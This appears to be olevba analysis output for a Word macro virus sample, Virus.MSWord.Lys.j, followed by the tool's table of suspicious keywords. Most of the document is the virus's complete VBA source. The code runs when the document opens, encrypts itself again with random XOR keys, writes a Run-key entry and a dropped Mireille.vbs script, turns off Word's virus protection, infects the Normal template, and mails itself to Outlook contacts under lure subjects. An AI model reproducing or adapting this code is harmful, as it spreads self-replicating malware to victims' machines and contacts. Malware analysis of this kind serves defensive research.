olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lys.j
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Lys.j 
in file: Virus.MSWord.Lys.j - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "ThisDocument"
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Private Sub Document_Open()
Application.EnableCancelKey = wdCancelDisabled
For V1 = 18 To 77
V2 = Null
V3 = (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(V1, 1))
V4 = Asc((Mid(V3, 2, 1)))
V5 = V4 Xor 39
For V6 = 3 To Len(V3)
V7 = Asc(Mid(V3, V6, 1)) Xor V5
V2 = V2 & Chr(V7)
Next
V8 = V2
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine V1, V8
Next
Call VM
End Sub
Private Sub VM()
On Error Resume Next
For V1 = 18 To 77
V2 = Null
V3 = "'" & (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(V1, 1))
V4 = Int(Rnd() * 8) + 1
For V5 = 1 To Len(V3)
V6 = Asc(Mid(V3, V5, 1)) Xor V4
V2 = V2 & Chr(V6)
Next V5
V7 = V2
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine V1, "'" & V7
Next V1
TD = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Mireille") = "C:\Mireille.vbs"
Open "C:\Mireille.vbs" For Output As #1
Print #1, "Set wordobj = CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "Mireille = wscript.ScriptFullName"
Print #1, "Set NT = wordobj.NormalTemplate.VBProject.VBComponents.Item(1)"
Print #1, "NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines"
Print #1, "NT.CodeModule.AddFromFile Mireille"
Print #1, "NT.CodeModule.DeleteLines 1, 7"
Print #1, "wordobj.Quit"
Print #1, TD
Close #1
Options.VirusProtection = (Rnd * 0)
Options.SaveNormalPrompt = (Rnd * 0)
Options.ConfirmConversions = (Rnd * 0)
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString TD
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString TD
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Mireille") <> "Beauty" Then
Set W1 = CreateObject("Outlook.Application")
Set MN = objOL.GetNameSpace("MAPI")
If W1 = "Outlook" Then
W3.Logon "profile", "password"
For W2 = 1 To W3.AddressLists.Count
Set AddyBook = W3.AddressLists(W2)
Set W4 = W1.CreateItem(0)
For W5 = 1 To AddyBook.AddressEntries.Count
W6 = AddyBook.AddressEntries(W5)
W4.Recipients.Add Peep
Next W5
W4.Subject = "Important Message From " & Application.UserName
W7 = Int(Rnd * 4) + 1
If W7 = 1 Then W8 = "This is interesting..."
If W7 = 2 Then W8 = "Look what I found..."
If W7 = 3 Then W8 = "Check this out..."
If W7 = 4 Then W8 = "Read this..."
If W7 = 5 Then W8 = ""
W4.Body = W8
W4.Attachments.Add ThisDocument.FullName
W4.Send
W6 = ""
Next W2
W3.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Mireille") = "Beauty"
End If 'Mireille The Goddess
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Mireille.vbs        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

